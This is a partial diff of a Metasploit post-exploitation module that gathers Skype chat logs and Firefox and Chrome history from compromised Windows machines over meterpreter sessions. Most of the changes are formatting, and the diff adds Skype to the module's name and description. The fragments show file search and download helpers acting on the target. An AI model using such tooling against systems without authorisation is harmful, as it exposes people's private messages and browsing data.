@@ -15,19 +15,19 @@ class MetasploitModule < Msf::Post
 
   STORE_FILE_TYPE = 'binary/db'
 
-  def initialize(info = {})
-    super(update_info(info,
-                      'Name'         => 'Windows Gather Firefox, and Chrome Artifacts',
-                      'Description'  => %q{
-          Gathers Firefox history, and Chrome history data from the target machine.
+  def initialize(info={})
+    super( update_info( info,
+        'Name' => 'Windows Gather Skype, Firefox, and Chrome Artifacts',
+        'Description' => %q{
+          Gathers Skype chat logs, Firefox history, and Chrome history data from the target machine.
         },
-                      'License'      => MSF_LICENSE,
-                      'Author'       => [
-                              'Joshua Harper <josh[at]radixtx.com>' # @JonValt
-                      ],
-                      'Platform'     => %w{ win },
-                      'SessionTypes' => ['meterpreter']
-          ))
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Joshua Harper <josh[at]radixtx.com>' # @JonValt
+        ],
+        'Platform' => %w{ win },
+        'SessionTypes' => [ 'meterpreter' ]
+      ))
   end
 
   #
@@ -55,9 +55,9 @@ class MetasploitModule < Msf::Post
   #
   # Check to see if the artifact exists on the remote system.
   #
-  def check_artifact(profile, opts = {})
+  def check_artifact(profile, opts={})
     path = profile[opts[:path]]
-    dir  = opts[:dir]
+    dir = opts[:dir]
 
     dirs = session.fs.dir.foreach(path).collect
 
@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Post
   #
   # Download the artifact from the remote system if it exists.
   #
-  def download_artifact(profile, opts = {})
+  def download_artifact(profile, opts={})
     name = opts[:name]
 
     print_status("Checking for #{name} artifacts...")
@@ -79,11 +79,11 @@ class MetasploitModule < Msf::Post
     print_good("#{name} directory found #{profile['UserName']}")
 
     fname = opts[:fname]
-    dir   = opts[:dir]
-    path  = opts[:path]
+    dir = opts[:dir]
+    path = opts[:path]
 
     artifact_path = "#{profile[path]}\\#{dir}"
-    file          = session.fs.file.search(artifact_path, "#{fname}", true)
+    file = session.fs.file.search(artifact_path, "#{fname}", true)
 
     return false unless file
 
